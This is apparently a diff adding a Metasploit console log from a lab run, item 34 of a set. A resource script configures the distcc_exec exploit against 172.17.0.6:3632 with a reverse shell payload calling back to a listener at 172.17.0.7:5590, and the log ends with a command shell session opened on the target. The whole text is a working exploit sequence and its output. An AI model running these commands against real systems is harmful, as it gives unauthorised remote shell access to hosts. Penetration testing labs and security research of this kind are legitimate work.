@@ -1,0 +1,27 @@
+[*] Processing /tmp/msf_before_item34.rc for ERB directives.
+resource (/tmp/msf_before_item34.rc)> use exploit/unix/misc/distcc_exec
+[*] No payload configured, defaulting to cmd/unix/reverse_bash
+resource (/tmp/msf_before_item34.rc)> set RHOSTS 172.17.0.6
+RHOSTS => 172.17.0.6
+resource (/tmp/msf_before_item34.rc)> set RPORT 3632
+RPORT => 3632
+resource (/tmp/msf_before_item34.rc)> set PAYLOAD cmd/unix/reverse
+PAYLOAD => cmd/unix/reverse
+resource (/tmp/msf_before_item34.rc)> set LHOST 172.17.0.7
+LHOST => 172.17.0.7
+resource (/tmp/msf_before_item34.rc)> set LPORT 5590
+LPORT => 5590
+resource (/tmp/msf_before_item34.rc)> exploit
+[*] Started reverse TCP double handler on 172.17.0.7:5590 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo V9ubjdlt8xobLArl;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "V9ubjdlt8xobLArl\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (172.17.0.7:5590 -> 172.17.0.6:59374) at 2026-03-25 15:33:23 +0000
+
